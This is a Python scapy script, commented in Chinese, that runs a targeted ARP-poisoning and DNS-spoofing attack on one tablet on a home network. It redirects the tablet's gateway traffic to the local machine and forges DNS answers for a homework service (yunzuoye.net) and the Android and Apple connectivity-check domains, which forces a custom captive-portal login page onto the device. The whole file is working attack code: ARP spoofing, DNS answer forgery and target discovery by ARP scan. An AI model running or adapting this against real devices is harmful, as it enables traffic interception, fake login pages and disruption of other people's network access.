#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
arp_captive.py — 定向 ARP 毒化 + DNS 抢答，为平板"制造"一个需要认证的网络

作用链:
  [1] 单向向目标平板宣告: 网关(192.168.3.1)的 MAC = 本机 MAC
      → 平板所有出网流量改道到本机
  [2] 嗅探目标发出的 UDP/53 查询, 伪造 DNS 应答(源 IP = 平板原本的 DNS 服务器)
      → *.yunzuoye.net 与连通性探测域名一律解析到本机
  [3] 平板 GET http://<本机>/generate_204 → portal_server 回 302
      → Android 判定 CAPTIVE_PORTAL, 自动弹出定制认证页
  [4] 认证通过后 /generate_204 → 204, 网络状态翻转, 智通云重走服务发现

红线:
  * 只对目标平板 IP 单播, 不广播
  * 不毒化路由器(不做双向), 不影响家里其它设备
  * 不动网卡、不改路由表
  * Ctrl+C 退出时自动把正确的网关 ARP 交还给平板

用法:
  python arp_captive.py --discover
  python arp_captive.py --target-ip 192.168.3.81
  python arp_captive.py --restore --target-ip 192.168.3.81
"""
import argparse
import os
import signal
import sys
import threading
import time

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

try:
    from scapy.all import (ARP, DNS, DNSQR, DNSRR, Ether, IP, UDP,
                           conf, get_if_hwaddr, getmacbyip, sendp, sniff, srp)
except ImportError:
    print("[X] 需要 scapy:  pip install scapy")
    sys.exit(2)

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "arp_captive.log")
_lock = threading.Lock()


def log(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"{ts} {msg}"
    print(line, flush=True)
    try:
        with _lock, open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass


def resolve_iface(local_ip):
    try:
        for name, dev in conf.ifaces.items():
            ip = getattr(dev, "ip", None)
            if ip == local_ip:
                mac = getattr(dev, "mac", None) or get_if_hwaddr(name)
                return name, mac
    except Exception:
        pass
    for cand in ("WLAN 2", "WLAN", "Wi-Fi", "WLAN2"):
        try:
            m = get_if_hwaddr(cand)
            if m:
                return cand, m
        except Exception:
            continue
    return None, None


DEFAULT_HIJACK = (
    "yunzuoye.net",
    "connectivitycheck.gstatic.com",
    "www.google.com",
    "play.googleapis.com",
    "connectivitycheck.android.com",
    "captive.apple.com",
)


def should_hijack(qname, patterns, hijack_all):
    if hijack_all:
        return True
    q = qname.lower().rstrip(".")
    for p in patterns:
        p = p.lower().strip()
        if not p:
            continue
        if q == p or q.endswith("." + p):
            return True
    return False


class Captive:
    def __init__(self, a):
        self.local_ip = a.local_ip
        self.gw_ip = a.gateway_ip
        self.tab_ip = a.target_ip
        self.tab_mac = a.target_mac.lower() if a.target_mac else None
        self.interval = a.interval
        self.hijack_all = a.hijack_all
        self.patterns = [x for x in (a.hijack or "").split(",") if x.strip()] or list(DEFAULT_HIJACK)
        self.iface = a.iface
        self.my_mac = None
        self.gw_mac = None
        self.stop = threading.Event()

    def prepare(self):
        if not self.iface:
            self.iface, self.my_mac = resolve_iface(self.local_ip)
        if not self.iface:
            log(f"[X] 找不到绑定 {self.local_ip} 的网卡")
            return False
        if not self.my_mac:
            self.my_mac = get_if_hwaddr(self.iface)
        log(f"[i] 网卡={self.iface} 本机MAC={self.my_mac} 本机IP={self.local_ip}")

        if not self.tab_ip:
            if not self.discover():
                return False
        log(f"[i] 目标平板: {self.tab_ip} MAC={self.tab_mac}")

        self.gw_mac = getmacbyip(self.gw_ip)
        if not self.gw_mac:
            log(f"[X] 拿不到网关 {self.gw_ip} 的 MAC，先 ping 一下网关")
            return False
        log(f"[i] 网关: {self.gw_ip} MAC={self.gw_mac}")
        return True

    def discover(self):
        want = (self.tab_mac or "80:20:fd:8b:4b:fa").lower()
        prefix = self.local_ip.rsplit(".", 1)[0]
        log(f"[i] 扫描 {prefix}.0/24 寻找 {want} ...")
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=f"{prefix}.0/24"),
                         iface=self.iface, timeout=4, verbose=False, retry=1)
        except Exception as e:
            log(f"[X] 扫描失败: {e}")
            return False
        online = [(r.psrc, r.hwsrc.lower()) for _, r in ans]
        for ip, mac in online:
            if mac == want:
                self.tab_ip, self.tab_mac = ip, mac
                log(f"[+] 找到平板: {ip} / {mac}")
                return True
        log(f"[!] 未找到目标 MAC，当前在线 {len(online)} 台:")
        for ip, mac in online:
            log(f"      {ip:16s} {mac}")
        return False

    def _poison_once(self, count=1, inter=0):
        pkt = (Ether(dst=self.tab_mac, src=self.my_mac) /
               ARP(op=2, hwsrc=self.my_mac, psrc=self.gw_ip,
                   hwdst=self.tab_mac, pdst=self.tab_ip))
        sendp(pkt, iface=self.iface, count=count, inter=inter, verbose=False)

    def poison_loop(self):
        log("[*] 开始单向 ARP 毒化 (网关 → 本机)")
        n = 0
        while not self.stop.is_set():
            try:
                self._poison_once()
                n += 1
                if n % 20 == 1:
                    log(f"[+] 毒化心跳 x{n}")
            except Exception as e:
                log(f"[!] 毒化异常: {e}")
            self.stop.wait(self.interval)

    def restore(self, count=6):
        log("[*] 交还网关 ARP 给平板 ...")
        pkt = (Ether(dst=self.tab_mac, src=self.gw_mac) /
               ARP(op=2, hwsrc=self.gw_mac, psrc=self.gw_ip,
                   hwdst=self.tab_mac, pdst=self.tab_ip))
        sendp(pkt, iface=self.iface, count=count, inter=0.3, verbose=False)
        log("[+] 已交还")

    def on_packet(self, pkt):
        try:
            if not (pkt.haslayer(DNS) and pkt.haslayer(UDP) and pkt.haslayer(IP)):
                return
            dns = pkt[DNS]
            if dns.qr != 0 or dns.qdcount < 1:
                return
            if pkt[IP].src != self.tab_ip or pkt[UDP].dport != 53:
                return
            qname = dns[DNSQR].qname.decode("utf-8", "ignore").rstrip(".")
            if not should_hijack(qname, self.patterns, self.hijack_all):
                return
            ans = (Ether(src=self.my_mac, dst=self.tab_mac) /
                   IP(src=pkt[IP].dst, dst=self.tab_ip) /
                   UDP(sport=53, dport=pkt[UDP].sport) /
                   DNS(id=dns.id, qr=1, aa=1, rd=1, ra=1, qd=dns.qd,
                       an=DNSRR(rrname=dns[DNSQR].qname, type="A", ttl=20,
                                rdata=self.local_ip)))
            sendp(ans, iface=self.iface, verbose=False)
            log(f"[DNS] {qname} -> {self.local_ip}")
        except Exception as e:
            log(f"[!] DNS 处理异常: {e}")

    def sniff_loop(self):
        log(f"[*] 开始 DNS 抢答监听 (host {self.tab_ip})")
        try:
            sniff(iface=self.iface, filter=f"udp port 53 and host {self.tab_ip}",
                  prn=self.on_packet, store=False,
                  stop_filter=lambda p: self.stop.is_set())
        except Exception as e:
            log(f"[X] 嗅探结束: {e}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local-ip", default="192.168.3.26")
    ap.add_argument("--gateway-ip", default="192.168.3.1")
    ap.add_argument("--target-ip", default=None)
    ap.add_argument("--target-mac", default="80:20:fd:8b:4b:fa")
    ap.add_argument("--iface", default=None)
    ap.add_argument("--interval", type=float, default=1.5)
    ap.add_argument("--hijack", default=None)
    ap.add_argument("--hijack-all", action="store_true")
    ap.add_argument("--discover", action="store_true")
    ap.add_argument("--restore", action="store_true")
    a = ap.parse_args()

    c = Captive(a)

    if a.discover:
        c.iface, c.my_mac = (a.iface, None) if a.iface else resolve_iface(a.local_ip)
        if not c.iface:
            log("[X] 找不到网卡")
            return 2
        c.my_mac = c.my_mac or get_if_hwaddr(c.iface)
        print(f"IFACE={c.iface}")
        if c.discover():
            print(f"TARGET_IP={c.tab_ip}")
            return 0
        return 1

    if not c.prepare():
        return 2

    if a.restore:
        c.restore()
        return 0

    def bye(*_):
        c.stop.set()
        log("[*] 收到退出信号")
    signal.signal(signal.SIGINT, bye)
    try:
        signal.signal(signal.SIGTERM, bye)
    except Exception:
        pass

    t = threading.Thread(target=c.sniff_loop, daemon=True)
    t.start()
    try:
        c.poison_loop()
    finally:
        c.restore()
        log("[*] 已退出")
    return 0


if __name__ == "__main__":
    sys.exit(main())
